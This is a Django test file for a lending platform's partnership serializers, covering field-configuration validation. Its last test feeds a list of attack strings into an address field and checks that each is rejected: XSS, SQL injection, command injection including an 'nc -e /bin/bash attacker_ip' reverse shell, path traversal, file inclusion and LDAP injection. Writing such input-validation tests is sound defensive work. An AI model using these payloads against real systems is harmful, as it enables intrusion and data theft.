import pytest
from django.test.testcases import TestCase
from faker import Faker

from juloserver.application_flow.constants import PartnerNameConstant
from juloserver.core.utils import JuloFakerProvider
from juloserver.julo.partners import PartnerConstant
from juloserver.julo.tests.factories import (
    PartnerFactory,
    ApplicationFactory,
    CustomerFactory,
    ProductLineFactory,
    ProvinceLookupFactory,
    CityLookupFactory,
    DistrictLookupFactory,
    SubDistrictLookupFactory,
)
from juloserver.partnership.constants import PartnershipFlag
from juloserver.partnership.crm.serializers import (
    AgentAssistedUploadScoringUserDataSerializer,
    AgentAssistedCompleteUserDataStatusUpdateSerializer,
    AgentAssistedFDCPreCheckSerializer,
)
from juloserver.partnership.models import PartnershipFlowFlag

fake = Faker()
fake.add_provider(JuloFakerProvider)


class TestAgentAssistedUploadScoringUserDataSerializer(TestCase):
    def setUp(self):
        self.partner = PartnerFactory(is_active=True, name=PartnerConstant.GOSEL)
        self.julo_product = ProductLineFactory(product_line_code=1)

        # Create partnership flow flag config
        self.partnership_flow_flag = PartnershipFlowFlag.objects.create(
            partner=self.partner,
            name=PartnershipFlag.FIELD_CONFIGURATION
        )
        self.field_configs = {}
        if self.partnership_flow_flag and self.partnership_flow_flag.configs:
            self.field_configs = self.partnership_flow_flag.configs

        self.customer = CustomerFactory()
        self.application = ApplicationFactory(
            customer=self.customer, product_line=self.julo_product, application_xid=919
        )

        ProvinceLookupFactory(province='DKI Jakarta')

        self.data = {
            "application_xid": self.application.application_xid,
            "email": fake.random_email(),
            "ktp": '9334560101921110',
            "dob": '1990-01-01',
            "gender": 'Pria',
            "address_provinsi": 'DKI Jakarta',
            "occupied_since": '1990-01-01',
            "home_status": 'Milik keluarga',
            "dependent": 1,
            "mobile_phone_1": '082218021511',
            "job_type": 'Freelance',
            "job_industry": 'Transportasi',
            "job_description": 'Supir / Ojek',
            "job_start": '2020-11-11',
            "payday": 15,
            "last_education": 'S1',
            "monthly_income": 10000000,
            "monthly_expenses": 200000,
            "monthly_housing_cost": 200000,
            "total_current_debt": 0,
        }

    def test_validate_dependent(self):

        # Without field config with data
        serializer = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer.is_valid())

        # Without field config without data
        self.data['dependent'] = ''
        serializer_2 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_2.is_valid())

        # Set config to False
        self.partnership_flow_flag.configs = {
            "occupied_since": False,
            "dependent": False,
            "monthly_expenses": False,
        }
        self.partnership_flow_flag.save()
        self.field_configs = self.partnership_flow_flag.configs

        # With field config False and exist data
        self.data['dependent'] = 1
        serializer_3 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_3.is_valid())

        # With field config False and empty data
        self.data['dependent'] = ''
        serializer_4 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_4.is_valid())

        # Set config to True
        self.partnership_flow_flag.configs.update(
            {'dependent': True}
        )
        self.partnership_flow_flag.save()
        self.field_configs = self.partnership_flow_flag.configs

        # With field config True and exist data
        self.data['dependent'] = 0
        serializer_5 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_5.is_valid())

        # With field config True and empty data
        self.data['dependent'] = ''
        serializer_6 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_6.is_valid())
        self.assertIsNotNone(serializer_6.errors.get('dependent'))

        # With field config True and not digit
        self.data['dependent'] = 'aa'
        serializer_7 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_7.is_valid())
        self.assertIsNotNone(serializer_7.errors.get('dependent'))

        # With field config True and value more than 9
        self.data['dependent'] = '15'
        serializer_7 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_7.is_valid())
        self.assertIsNotNone(serializer_7.errors.get('dependent'))

    def test_validate_monthly_expenses(self):
        # Without field config with data
        serializer = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer.is_valid())

        # Without field config without data
        self.data['monthly_expenses'] = ''
        serializer_2 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_2.is_valid())

        # Set config to False
        self.partnership_flow_flag.configs = {
            "occupied_since": False,
            "dependent": False,
            "monthly_expenses": False,
        }
        self.partnership_flow_flag.save()
        self.field_configs = self.partnership_flow_flag.configs

        # With field config False and exist data
        self.data['monthly_expenses'] = 10000
        serializer_3 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_3.is_valid())

        # With field config False and empty data
        self.data['monthly_expenses'] = None
        serializer_4 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_4.is_valid())

        # Set config to True
        self.partnership_flow_flag.configs.update(
            {'monthly_expenses': True}
        )
        self.partnership_flow_flag.save()
        self.field_configs = self.partnership_flow_flag.configs

        # With field config True and exist data
        self.data['monthly_expenses'] = 1000000
        serializer_5 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_5.is_valid())

        # With field config True and empty data
        self.data['monthly_expenses'] = None
        serializer_6 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_6.is_valid())
        self.assertIsNotNone(serializer_6.errors.get('monthly_expenses'))

        # With field config True and not digit
        self.data['monthly_expenses'] = 'aa'
        serializer_7 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_7.is_valid())
        self.assertIsNotNone(serializer_7.errors.get('monthly_expenses'))

    def test_validate_occupied_since(self):
        # Without field config with data
        serializer = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer.is_valid())

        # Without field config without data
        self.data['occupied_since'] = ''
        serializer_2 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_2.is_valid())

        # Set config to False
        self.partnership_flow_flag.configs = {
            "occupied_since": False,
            "dependent": False,
            "monthly_expenses": False,
        }
        self.partnership_flow_flag.save()
        self.field_configs = self.partnership_flow_flag.configs

        # With field config False and exist data
        self.data['occupied_since'] = '1990-01-01'
        serializer_3 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_3.is_valid())

        # With field config False and empty data
        self.data['occupied_since'] = ''
        serializer_4 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_4.is_valid())

        # Set config to True
        self.partnership_flow_flag.configs.update(
            {'occupied_since': True}
        )
        self.partnership_flow_flag.save()
        self.field_configs = self.partnership_flow_flag.configs

        # With field config True and exist data
        self.data['occupied_since'] = '1990-01-01'
        serializer_5 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(True, serializer_5.is_valid())

        # With field config True and empty data
        self.data['occupied_since'] = ''
        serializer_6 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_6.is_valid())
        self.assertIsNotNone(serializer_6.errors.get('occupied_since'))

        # With field config True and invalid format
        self.data['occupied_since'] = '19900101'
        serializer_6 = AgentAssistedUploadScoringUserDataSerializer(
            self.application, data=self.data, partial=True, context={'field_config': self.field_configs}
        )
        self.assertEqual(False, serializer_6.is_valid())
        self.assertIsNotNone(serializer_6.errors.get('occupied_since'))


class TestAgentAssistedCompleteUserDataStatusUpdateSerializer(TestCase):
    def setUp(self):
        self.partner = PartnerFactory(is_active=True, name=PartnerNameConstant.CERMATI)
        self.julo_product = ProductLineFactory(product_line_code=1)

        # Create partnership flow flag config
        self.partnership_flow_flag = PartnershipFlowFlag.objects.create(
            partner=self.partner,
            name=PartnershipFlag.FIELD_CONFIGURATION,
            configs={'close_kin_name': True},
        )
        self.field_configs = {}
        if self.partnership_flow_flag and self.partnership_flow_flag.configs:
            self.field_configs = self.partnership_flow_flag.configs

        self.customer = CustomerFactory()
        self.application = ApplicationFactory(
            customer=self.customer,
            product_line=self.julo_product,
            email='a@gmail.com',
            application_xid=919,
            partner=self.partner,
        )

        province = ProvinceLookupFactory(province=self.application.address_provinsi)
        city = CityLookupFactory(city=self.application.address_kabupaten, province=province)
        district = DistrictLookupFactory(district=self.application.address_kecamatan, city=city)
        SubDistrictLookupFactory(
            sub_district=self.application.address_kelurahan,
            zipcode=self.application.address_kodepos,
            district=district,
        )
        self.data = {
            "application_xid": self.application.application_xid,
            "email": self.application.email,
            "mobile_phone_1": self.application.mobile_phone_1,
            "ktp": self.application.ktp,
            "birth_place": "Jakarta",
            "mother_maiden_name": "mother maiden name",
            "address_street_num": "address street num",
            "address_kabupaten": self.application.address_kabupaten,
            "address_kecamatan": self.application.address_kecamatan,
            "address_kelurahan": self.application.address_kelurahan,
            "address_kodepos": self.application.address_kodepos,
            "marital_status": "Lajang",
            "close_kin_name": "close kin name",
            "spouse_name": "spouse name",
            "spouse_mobile_phone": "082212345678",
            "kin_relationship": "Orang tua",
            "kin_name": "kin name",
            "kin_mobile_phone": "082212345678",
            "company_name": "PT. XYZ",
            "company_phone_number": "0218888123",
            "ktp_photo": "https://picsum.photos/200/300",
            "selfie_photo": "https://picsum.photos/200/300",
            "photo_of_income_proof": "https://picsum.photos/200/300",
        }

    @pytest.mark.skip(reason="Flaky")
    def test_success_serializer(self):
        serializer = AgentAssistedCompleteUserDataStatusUpdateSerializer(data=self.data)
        self.assertEqual(True, serializer.is_valid())

    @pytest.mark.skip(reason="Flaky")
    def test_success_married_serializer(self):
        self.data['marital_status'] = 'Menikah'
        serializer = AgentAssistedCompleteUserDataStatusUpdateSerializer(data=self.data)
        self.assertEqual(True, serializer.is_valid())

    def test_not_valid_name(self):
        self.data['kin_name'] = 'test 123 123'
        serializer = AgentAssistedCompleteUserDataStatusUpdateSerializer(data=self.data)
        self.assertEqual(False, serializer.is_valid())


class TestAgentAssistedFDCPreCheckSerializer(TestCase):
    def setUp(self):
        self.partner = PartnerFactory(is_active=True, name=PartnerNameConstant.CERMATI)
        self.julo_product = ProductLineFactory(product_line_code=1)

        # Create partnership flow flag config
        self.partnership_flow_flag = PartnershipFlowFlag.objects.create(
            partner=self.partner,
            name=PartnershipFlag.FIELD_CONFIGURATION,
            configs={'close_kin_name': True},
        )
        self.field_configs = {}
        if self.partnership_flow_flag and self.partnership_flow_flag.configs:
            self.field_configs = self.partnership_flow_flag.configs

        self.customer = CustomerFactory()
        self.application = ApplicationFactory(
            customer=self.customer,
            product_line=self.julo_product,
            email='a@gmail.com',
            application_xid=919,
            partner=self.partner,
        )

        province = ProvinceLookupFactory(province=self.application.address_provinsi)
        city = CityLookupFactory(city=self.application.address_kabupaten, province=province)
        district = DistrictLookupFactory(district=self.application.address_kecamatan, city=city)
        SubDistrictLookupFactory(
            sub_district=self.application.address_kelurahan,
            zipcode=self.application.address_kodepos,
            district=district,
        )
        self.data = {
            "application_xid": self.application.application_xid,
            'dob': "1992-04-25",
            'gender': "Pria",
            "birth_place": "Jakarta",
            "address_street_num": "address street num",
            "address_kabupaten": self.application.address_kabupaten,
            "address_kecamatan": self.application.address_kecamatan,
            "address_kelurahan": self.application.address_kelurahan,
            "address_kodepos": self.application.address_kodepos,
            "partner_name": self.partner.name,
        }

    def test_malicious_error(self):
        # Cross-Site Scripting (XSS)
        self.data['address_street_num'] = "<script>alert('XSS')</script>"
        serializer = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer.is_valid())
        self.data['address_street_num'] = "<img src=x onerror=alert(1)>"
        serializer2 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer2.is_valid())
        self.data['address_street_num'] = "<svg onload=alert('XSS')>"
        serializer3 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer3.is_valid())
        self.data['address_street_num'] = "<iframe src=javascript:alert('XSS')>"
        serializer4 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer4.is_valid())
        self.data['address_street_num'] = "<body onload=alert('XSS')>"
        serializer5 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer5.is_valid())
        self.data['address_street_num'] = "<a href='javascript:alert('XSS')'>Click me</a>"
        serializer6 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer6.is_valid())
        self.data['address_street_num'] = "><script>alert('Injected')</script>"
        serializer7 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer7.is_valid())

        # SQL INJECTION
        self.data['address_street_num'] = "' OR '1'='1'; --"
        serializer8 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer8.is_valid())
        self.data['address_street_num'] = " UNION SELECT null, username, password FROM users; --"
        serializer9 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer9.is_valid())
        self.data['address_street_num'] = "' AND 1=2 UNION SELECT 1, 'username', 'password'--"
        serializer10 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer10.is_valid())
        self.data['address_street_num'] = "') OR ('1'='1'"
        serializer11 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer11.is_valid())
        self.data['address_street_num'] = "admin' --"
        serializer12 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer12.is_valid())
        self.data['address_street_num'] = "1234'; DROP TABLE users; --"
        serializer13 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer13.is_valid())
        self.data['address_street_num'] = "'; WAITFOR DELAY '0:0:5'--"
        serializer14 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer14.is_valid())

        # COMMAND INJECTION
        self.data['address_street_num'] = "; ls -la"
        serializer15 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer15.is_valid())
        self.data['address_street_num'] = "&& cat /etc/passwd"
        serializer16 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer16.is_valid())
        self.data['address_street_num'] = "| whoami"
        serializer17 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer17.is_valid())
        self.data['address_street_num'] = "|| echo 'Injection Successful'"
        serializer18 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer18.is_valid())
        self.data['address_street_num'] = "$(reboot)"
        serializer19 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer19.is_valid())
        self.data['address_street_num'] = "& ping -c 4 8.8.8.8 &"
        serializer20 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer20.is_valid())
        self.data['address_street_num'] = "; nc -e /bin/bash attacker_ip 4444 #"
        serializer21 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer21.is_valid())

        # PATH TRANSVERSAL
        self.data['address_street_num'] = "../../etc/passwd"
        serializer22 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer22.is_valid())
        self.data['address_street_num'] = "../../../var/log/apache/access.log"
        serializer23 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer23.is_valid())
        self.data['address_street_num'] = "/../ or ..%2f"
        serializer24 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer24.is_valid())
        self.data['address_street_num'] = "../../../../../../windows/system32/cmd.exe"
        serializer25 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer25.is_valid())
        self.data['address_street_num'] = "%c0%af%c0%afetc%c0%afpasswd"
        serializer26 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer26.is_valid())
        self.data['address_street_num'] = "..%252f..%252f..%252f..%252fetc%252fpasswd"
        serializer27 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer27.is_valid())

        # LOCAL FILE INCLUSION (LFI)
        self.data['address_street_num'] = "../../etc/passwd"
        serializer28 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer28.is_valid())
        self.data['address_street_num'] = "../../../../../etc/passwd"
        serializer29 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer29.is_valid())
        self.data['address_street_num'] = "php://filter/convert.base64-encode/resource=targetfile"
        serializer30 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer30.is_valid())
        self.data['address_street_num'] = "php://input"
        serializer31 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer31.is_valid())
        self.data['address_street_num'] = "data://text/plain;base64,<base64-encoded-content>"
        serializer32 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer32.is_valid())
        self.data['address_street_num'] = "/var/www/html/index.php"
        serializer33 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer33.is_valid())

        # LDAP Injection
        self.data['address_street_num'] = "*)(uid=*))(|(uid=*))"
        serializer34 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer34.is_valid())
        self.data['address_street_num'] = "*)(cn=*))|(|(cn=*"
        serializer35 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer35.is_valid())
        self.data['address_street_num'] = "(&(objectClass=*))(|(uid=*))"
        serializer36 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer36.is_valid())
        self.data['address_street_num'] = "*admin*)"
        serializer37 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer37.is_valid())
        self.data['address_street_num'] = "admin)(|(password=*))"
        serializer38 = AgentAssistedFDCPreCheckSerializer(data=self.data)
        self.assertEqual(False, serializer38.is_valid())
